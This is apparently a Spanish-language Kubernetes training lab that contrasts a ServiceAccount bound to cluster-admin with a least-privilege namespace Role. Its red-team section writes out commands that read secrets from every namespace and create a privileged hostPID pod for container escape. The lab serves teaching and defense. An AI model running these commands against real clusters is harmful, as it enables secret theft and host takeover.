# Lab 2: RBAC Excesivo (cluster-admin)

## Objetivo

Demostrar el peligro de otorgar `cluster-admin` a un ServiceAccount. Un atacante
que comprometa un Pod con este SA tiene acceso total al cluster: puede leer secrets
de todos los namespaces, crear pods privilegiados y tomar control completo.

| Propiedad        | Valor                                    |
|------------------|------------------------------------------|
| **Namespace**    | `lab2-rbac`                              |
| **Ataque**       | SA cluster-admin -> control total        |
| **Defensa**      | Role minimo + RoleBinding por namespace  |
| **Dificultad**   | Basica                                   |

---

## Requisitos

- minikube corriendo (`minikube start`)
- kubectl configurado

---

## Parte 1: Escenario Vulnerable (Red Team)

### Paso 1 — Desplegar el escenario vulnerable

```bash
kubectl apply -f vulnerable-rbac.yaml

# Verificar recursos creados
kubectl get sa -n lab2-rbac
kubectl get clusterrolebinding sa-cluster-admin-binding
kubectl get pods -n lab2-rbac

# Esperar a que el pod este listo
kubectl wait --for=condition=Ready pod/attacker-pod -n lab2-rbac --timeout=120s
```

### Paso 2 — Explotar: Acceso total al cluster

```bash
# Entrar al pod atacante (tiene kubectl incluido)
kubectl exec -it attacker-pod -n lab2-rbac -- bash

# Dentro del pod: verificar identidad
kubectl auth whoami
kubectl auth can-i --list

# Listar TODOS los namespaces
kubectl get namespaces

# Leer secrets de CUALQUIER namespace
kubectl get secrets -A
kubectl get secrets -n kube-system
```

### Paso 3 — Escalacion: Crear un pod privilegiado

```bash
# Dentro del pod: crear un pod privilegiado para escape
kubectl run escape-pod --image=ubuntu:22.04 \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"ubuntu:22.04","command":["sleep","infinity"],"securityContext":{"privileged":true}}]}}' \
  -n lab2-rbac

# Verificar que se creo
kubectl get pods -n lab2-rbac

exit
```

---

## Parte 2: Escenario Seguro (Blue Team)

### Paso 1 — Limpiar el escenario vulnerable

```bash
kubectl delete -f vulnerable-rbac.yaml
# Nota: eliminar el ClusterRoleBinding es critico
kubectl delete clusterrolebinding sa-cluster-admin-binding --ignore-not-found
```

### Paso 2 — Desplegar RBAC con privilegio minimo

```bash
kubectl apply -f secure-rbac.yaml

kubectl get pods -n lab2-rbac
kubectl wait --for=condition=Ready pod/secure-pod -n lab2-rbac --timeout=120s
```

### Paso 3 — Verificar restricciones

```bash
# El pod seguro NO tiene kubectl, pero podemos verificar los permisos del SA
kubectl auth can-i --list --as=system:serviceaccount:lab2-rbac:minimal-sa -n lab2-rbac

# Debe mostrar SOLO: get/list en pods y services
# NO debe tener acceso a secrets, deployments, ni otros namespaces

# Verificar que NO tiene acceso a otros namespaces
kubectl auth can-i list secrets --as=system:serviceaccount:lab2-rbac:minimal-sa -n kube-system
# Resultado: no

kubectl auth can-i create pods --as=system:serviceaccount:lab2-rbac:minimal-sa -n lab2-rbac
# Resultado: no
```

---

## Diferencias Clave

| Aspecto              | Vulnerable                  | Seguro                     |
|----------------------|-----------------------------|----------------------------|
| Tipo de Role         | `ClusterRole` (cluster-admin)| `Role` (namespace-scoped)  |
| Tipo de Binding      | `ClusterRoleBinding`        | `RoleBinding`              |
| Verbos               | `*` (todos)                 | `get`, `list` (solo lectura)|
| Recursos accesibles  | Todo el cluster             | Solo pods y services       |
| Acceso a secrets     | Si                          | No                         |
| Acceso cross-namespace | Si                        | No                         |
| automountToken       | true (default)              | false                      |

---

## Limpieza

```bash
kubectl delete clusterrolebinding sa-cluster-admin-binding --ignore-not-found
kubectl delete namespace lab2-rbac
```
